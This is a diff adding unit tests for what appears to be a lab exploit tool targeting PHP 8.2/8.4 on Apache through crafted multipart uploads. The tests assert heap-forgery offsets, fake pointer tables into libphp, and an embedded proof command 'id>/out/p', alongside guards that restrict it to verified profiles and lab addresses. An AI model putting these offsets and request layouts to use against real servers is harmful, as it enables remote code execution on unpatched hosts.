@@ -1,6 +1,7 @@
 from __future__ import annotations
 
 import json
+import hashlib
 import importlib.util
 import argparse
 import socket
@@ -17,6 +18,7 @@ sys.path.insert(0, str(ROOT))
 
 from elf import inspect_elf, verify_elf_against_profile  # noqa: E402
 from exploit import LabExploit, resolve_lab_target  # noqa: E402
+from pure_http_oom import PureHttpOomExploit  # noqa: E402
 from profile import (  # noqa: E402
     ProfileError,
     load_profile,
@@ -29,6 +31,7 @@ from profile_tool import command_calibrate, command_manifest  # noqa: E402
 
 
 PROFILE_PATH = ROOT / "profiles" / "php-8.4.26-apache-amd64-fixed.json"
+PURE_PROFILE_PATH = ROOT / "profiles" / "php-8.2.34-apache-amd64-pure-http-oom.json"
 
 
 class ProfileTests(unittest.TestCase):
@@ -223,6 +226,84 @@ class GuardTests(unittest.TestCase):
         with mock.patch("socket.getaddrinfo", return_value=answers):
             with self.assertRaisesRegex(ProfileError, "non-lab address"):
                 resolve_lab_target("mixed.invalid", 80)
+
+
+class PureHttpOomProfileTests(unittest.TestCase):
+    def setUp(self) -> None:
+        self.profile = load_profile(PURE_PROFILE_PATH)
+
+    def test_complete_profile_is_verified(self) -> None:
+        self.assertEqual(self.profile.strategy, "pure-http-oom-v1")
+        self.assertEqual(self.profile.raw["request_recipe"]["b2"]["fake_array_offset"], "0xf9398")
+        require_verified(self.profile)
+
+    def test_candidate_copy_still_fails_closed(self) -> None:
+        data = json.loads(PURE_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["verification"] = {
+            "state": "candidate",
+            "runs": 0,
+            "proof": "test-only-candidate",
+            "verified_at": None,
+        }
+        with tempfile.TemporaryDirectory() as directory:
+            path = Path(directory) / "candidate.json"
+            path.write_text(json.dumps(data), encoding="utf-8")
+            with self.assertRaisesRegex(ProfileError, "only locally verified"):
+                require_verified(load_profile(path))
+
+    def test_display_mode_and_input_bounds_fail_closed(self) -> None:
+        data = json.loads(PURE_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["runtime"]["display_errors"] = True
+        with self.assertRaisesRegex(ProfileError, "must be false"):
+            validate_profile(data)
+        data = json.loads(PURE_PROFILE_PATH.read_text(encoding="utf-8"))
+        data["request_recipe"]["b2"]["after_fields"] = 498
+        with self.assertRaisesRegex(ProfileError, "max_input_vars"):
+            validate_profile(data)
+
+    def test_a1_uses_tail_variant_and_fixed_query(self) -> None:
+        engine = PureHttpOomExploit(mock.Mock(), self.profile, b"id>/out/p")
+        body, boundary, query = engine.build_a1()
+        self.assertEqual(len(boundary), 70)
+        self.assertEqual(
+            query,
+            "q0000000=v&q0000001=v&q0000002=v&q0000003=v&q0000004=v",
+        )
+        self.assertIn(b'name="PHP_SESSION_UPLOAD_PROGRESS"', body)
+        self.assertIn(b'name="t00' + b"t" * 32 + b'"', body)
+        self.assertTrue(body.endswith(b"--" + boundary + b"--\r\n"))
+        self.assertEqual(len(body), 1_117_868)
+        self.assertEqual(
+            hashlib.sha256(body).hexdigest(),
+            "643be7a49073fc4af53a2d87aec3ec4b7f67fade1f0d458d00c6f88675326178",
+        )
+
+    def test_b1_forge_uses_raw_chunk_offset(self) -> None:
+        engine = PureHttpOomExploit(mock.Mock(), self.profile, b"id>/out/p")
+        value = engine._forge_large_value(400, 8)
+        header = 0xE2968 - 0x1018
+        self.assertEqual(struct.unpack_from("<Q", value, header + 0x10)[0], 0xC8000)
+        self.assertEqual(value[header + 0x18:header + 0x20], b"/08BBBBB")
+
+    def test_b2_is_fixed_command_and_profile_geometry(self) -> None:
+        engine = PureHttpOomExploit(mock.Mock(), self.profile, b"id>/out/p")
+        main = 0x700000000000
+        libphp = 0x700100000000
+        body, boundary = engine.build_b2(main, libphp)
+        self.assertEqual(boundary, b"C" * 10)
+        self.assertIn(b"id>/out/p", body)
+        self.assertEqual(body.count(b'Content-Disposition: form-data; name="'), 998)
+        first = body.index(b"\r\n\r\n") + 4
+        table = main + 0xF9398
+        self.assertEqual(struct.unpack_from("<I", body, first + 8)[0], 1)
+        self.assertEqual(struct.unpack_from("<I", body, first + 12)[0], 0xA)
+        self.assertEqual(struct.unpack_from("<Q", body, first + 16)[0], table)
+        ht = body.index(b'name="ht"\r\n\r\n') + len(b'name="ht"\r\n\r\n')
+        self.assertEqual(struct.unpack_from("<Q", body, ht + 0x10)[0], table + 0x20)
+        self.assertEqual(struct.unpack_from("<Q", body, ht + 0x30)[0], libphp + 0x39B8A0)
+        self.assertEqual(body[ht + 0x98:ht + 0x98 + 9], b"id>/out/p")
+        with self.assertRaisesRegex(ProfileError, "fixed uid proof"):
+            PureHttpOomExploit(mock.Mock(), self.profile, b"uname -a")
 
 
 class RecipeTests(unittest.TestCase):
